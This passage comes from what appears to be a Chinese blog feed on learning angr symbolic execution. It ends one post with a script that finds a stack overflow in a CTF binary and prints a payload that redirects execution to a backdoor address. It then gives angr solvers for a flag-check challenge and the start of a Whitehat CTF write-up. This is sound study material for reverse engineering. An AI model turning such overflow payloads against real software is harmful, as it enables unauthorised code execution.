        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_offset<span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">*</span>before_size <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> input_bytes<span class="token punctuation">,</span> size<span class="token operator">=</span>size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>

        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pt<span class="token punctuation">,</span> input_bytes<span class="token punctuation">,</span> size<span class="token operator">=</span>size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>input_str_off<span class="token punctuation">,</span> size<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>


        symbol_num <span class="token operator">+=</span> size
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>st<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 0x4012CE</span>
<span class="token keyword">class</span> <span class="token class-name">hook_strcmp</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment"># 0x4010C0</span>
<span class="token keyword">class</span> <span class="token class-name">hook_printf</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>stack_pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./binary"</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'base_addr'</span><span class="token punctuation">:</span>base<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x401272</span><span class="token punctuation">,</span>hook_input_line<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x401216</span><span class="token punctuation">,</span>hook_input_val<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4010C0</span><span class="token punctuation">,</span>hook_printf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x4012CE</span><span class="token punctuation">,</span>hook_strcmp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> start<span class="token punctuation">)</span>
    st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token number">0x8000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rbp <span class="token operator">=</span> <span class="token number">0x7000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rbx <span class="token operator">=</span> <span class="token number">0x0</span>
    
    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
    sts <span class="token operator">=</span> <span class="token punctuation">[</span>st<span class="token punctuation">]</span>

    addr_of_strcpy     <span class="token operator">=</span> <span class="token number">0x4012CE</span>
    addr_of_input_line <span class="token operator">=</span> <span class="token number">0x401272</span>
    back_door          <span class="token operator">=</span> <span class="token number">0x401351</span>
    all_blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    may_has_overflow_block <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    may_has_overflow_block_addr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    has_overflow <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>sts<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st <span class="token operator">=</span> sts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        sts<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
        sucs <span class="token operator">=</span> st<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>successors

        <span class="token keyword">if</span> <span class="token punctuation">(</span>sucs<span class="token punctuation">)</span><span class="token punctuation">:</span>
            cap <span class="token operator">=</span> sucs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>block<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>capstone
            <span class="token keyword">if</span><span class="token punctuation">(</span>cap<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mnemonic <span class="token operator">==</span> <span class="token string">'mov'</span> <span class="token keyword">and</span> cap<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>op_str <span class="token operator">==</span> <span class="token string">'eax, 0'</span> <span class="token keyword">and</span> cap<span class="token punctuation">.</span>insns<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mnemonic <span class="token operator">==</span> <span class="token string">'jmp'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                sucs<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span>sucs <span class="token keyword">and</span> sucs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>addr <span class="token operator">==</span> <span class="token number">0x4012ce</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            sucs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>sucs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            st1 <span class="token operator">=</span> sucs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            st2 <span class="token operator">=</span> sucs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

            st1<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># 相等</span>
            str_size <span class="token operator">=</span> st1<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>st1<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_str_off<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 取出 size</span>
            st1_pt1 <span class="token operator">=</span> st1<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsi
            st1_pt2 <span class="token operator">=</span> st1<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rdi
            <span class="token comment">#LOG# print("LOAD string size: ",str_size)</span>
            st1_str1 <span class="token operator">=</span> st1<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>st1_pt1<span class="token punctuation">,</span> str_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
            st1_str2 <span class="token operator">=</span> st1<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>st1_pt2<span class="token punctuation">,</span> str_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>

            st1<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>st1_str1 <span class="token operator">==</span> st1_str2<span class="token punctuation">)</span>

            st2<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment"># 不等</span>
            st2_pt1 <span class="token operator">=</span> st2<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rsi
            st2_pt2 <span class="token operator">=</span> st2<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rdi
            st2_str1 <span class="token operator">=</span> st2<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>st1_pt1<span class="token punctuation">,</span> str_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
            st2_str2 <span class="token operator">=</span> st2<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>st1_pt2<span class="token punctuation">,</span> str_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
            st2<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>st2_str1 <span class="token operator">!=</span> st2_str2<span class="token punctuation">)</span>
        
        <span class="token keyword">for</span> i <span class="token keyword">in</span> sucs<span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> all_blocks<span class="token punctuation">:</span>
                all_blocks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token keyword">if</span> i<span class="token punctuation">.</span>addr <span class="token operator">==</span> <span class="token number">0x401272</span> <span class="token keyword">and</span> st<span class="token punctuation">.</span>addr <span class="token keyword">not</span> <span class="token keyword">in</span> may_has_overflow_block_addr<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"LOG: FIND ONE MAY OVERFLOW "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>st<span class="token punctuation">.</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
                size <span class="token operator">=</span> i<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_str_off<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 取出 size</span>
                all_ins <span class="token operator">=</span> st<span class="token punctuation">.</span>block<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>capstone<span class="token punctuation">.</span>insns
                <span class="token keyword">if</span> all_ins<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mnemonic <span class="token operator">==</span> <span class="token string">'lea'</span><span class="token punctuation">:</span>
                    op_str <span class="token operator">=</span> all_ins<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>op_str
                    find_0x<span class="token operator">=</span> op_str<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
                    off <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>op_str<span class="token punctuation">[</span>find_0x<span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span>base <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> size <span class="token operator">></span> off<span class="token punctuation">:</span>
                        <span class="token keyword">global</span> out_off
                        <span class="token keyword">global</span> out_size
                        out_off <span class="token operator">=</span> off
                        out_size <span class="token operator">=</span> size
                        has_overflow<span class="token punctuation">.</span>append<span class="token punctuation">(</span>st<span class="token punctuation">)</span>
                        sts<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">break</span>
            sts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    result <span class="token operator">=</span> <span class="token string">b''</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>has_overflow<span class="token punctuation">)</span><span class="token punctuation">:</span>
        res_st <span class="token operator">=</span> has_overflow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        symbol_size <span class="token operator">=</span> res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        size <span class="token operator">=</span> res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>symbol_size<span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
            my_type <span class="token operator">=</span> res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_offset <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span>
            my_size <span class="token operator">=</span> res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_offset <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>my_type <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                tmp_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_offset <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> my_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                result <span class="token operator">+=</span> tmp_str <span class="token operator">+</span> <span class="token string">b' '</span>
            <span class="token keyword">elif</span> <span class="token punctuation">(</span>my_type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                result <span class="token operator">+=</span> res_st<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>res_st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>input_offset <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> my_size<span class="token punctuation">,</span> endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>
        result <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'a'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>back_door<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>符号执行</category>
        <category>Angr</category>
      </categories>
      <tags>
        <tag>符号执行</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>Angr 学习与实践</title>
    <url>/2021/08/16/angr_learn_introduction/</url>
    <content><![CDATA[<h1 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h1><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><h3 id="little-engine-DONE"><a href="#little-engine-DONE" class="headerlink" title="little_engine | DONE"></a>little_engine | DONE</h3><blockquote>
<p>Script author: Michael Reeves (github: @mastermjr)<br>Script runtime: 3 min 26 seconds (206 seconds)<br>Concepts presented:<br>stdin constraining, concrete optimization with Unicorn</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/main.jpg" alt="main"></p>
<p>映入眼帘的看上去应该是 CPP 编译的程序。似乎是因为一些优化或者语言本身的问题，简单的一个程序流，看上去极其诡异。动调后得知。程序会吞掉第一个输入的字符(字符的ascii要小于 0x7E)。然后剩下的是输入 flag ，flag 的长度是 75，不同函数之间通过 RDI 传递传出字符串等参数。在分析的时候会发现程序会把输入的字符串转储到 RDI 所指向的一个数据结构中。根据不同的长度进行不同的转储（我打赌源程序猿不可能写出这种东西）<img src="https://cdn.jsdelivr.net/gh/wr-web/picture/store.jpg" alt="store"></p>
<p>然后经过一个简单的加密，不清楚什么算法，这部分通过 angr 当一个黑盒不管了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/encrypt2.jpg" alt="encrypt"></p>
<p>最后通过在死亡的路径中，寻找输出流中存在 “Chugga” 的，就能得到 flag 的求解的结果。</p>
<p>模仿的 Script author: Michael Reeves (github: @mastermjr)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> angr
<span class="token keyword">import</span> IPython

<span class="token comment"># import string</span>

<span class="token comment"># 关于这个数字我我不清楚为什么输入流是两个两个的状态</span>
<span class="token comment"># 原作者说因为它有四倍的数组长度，所以它使用的是 len = 1+75*4,不过我暂时没有观察到这个现象，疑惑中,符号少一点也可以的 比如 1+75*2</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./engine"</span><span class="token punctuation">)</span>
    input_length <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">75</span>
    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'flag_%d'</span> <span class="token operator">%</span> i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>input_length<span class="token punctuation">)</span><span class="token punctuation">]</span>

    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span>
        <span class="token comment"># 不使用差不多差个 50 秒</span>
        <span class="token comment"># add_options=angr.options.unicorn,</span>
        stdin<span class="token operator">=</span>flag
    <span class="token punctuation">)</span>
    <span class="token comment"># 添加约束,可打印字符,ascii 表中的 32~126 ，string.printable</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_chars<span class="token punctuation">:</span>
        state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>
        <span class="token comment"># 注意规避 ' ' 否则会陷入 libc 中</span>
        state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>

    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 计算时间</span>
    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
    sm<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Time: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># 从结束（死亡）的路径中寻找输出过成功字符串的状态</span>

    target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> sm<span class="token punctuation">.</span>deadended<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">b'Chugga'</span> <span class="token keyword">in</span> i<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            target<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    <span class="token keyword">if</span> target<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>我有许多地方没搞明白 ，第一是输入流，输出流，符号数量的问题，第二个是求解引擎为什么是 unicorn ，要看看源码了。</p>
<h3 id="Whitehat-CTF-2015-Crypto-400-DONE"><a href="#Whitehat-CTF-2015-Crypto-400-DONE" class="headerlink" title="Whitehat CTF 2015 - Crypto 400 |DONE"></a>Whitehat CTF 2015 - Crypto 400 |DONE</h3><blockquote>
<p>Script author: Yan Shoshitaishvili (github: @Zardus)<br>Script runtime: 30 seconds<br>Concepts presented: statically linked binary (manually hooking with function summaries), commandline argument, partial solutions</p>
</blockquote>
<p>这个样例是先找到部分解的路径，然后再用部分解爆破出最后的 flag 由于只有 8 byte 的 flag ，所以只用了 30s ，不过还好只有 8 个字节，就算只有 32 个字节，估计爆破就不是很行了，还是得约束求解，不过怎么部分解的，还是有必要观摩一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-07-28_17-14-34.jpg" alt="Snipaste_2021-07-28_17-14-34"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/Snipaste_2021-07-28_17-14-24.jpg" alt="Snipaste_2021-07-28_17-14-24"></p>
<p>找到 main 之后通过 check1 ，可以有多解，然后再爆破 check2,不过这个脚本也有一个很有意思的地方，就是用了 progressbar，比较直观</p>
<p>原脚本 <a href="https://github.com/angr/angr-doc/tree/master/examples/whitehat_crypto400/solve.py">whitehat_crypto400_scrypt</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 稍微 mark 一些写法，挺有意思的</span>
<span class="token comment"># hook 函数，或者某处的简易方法</span>
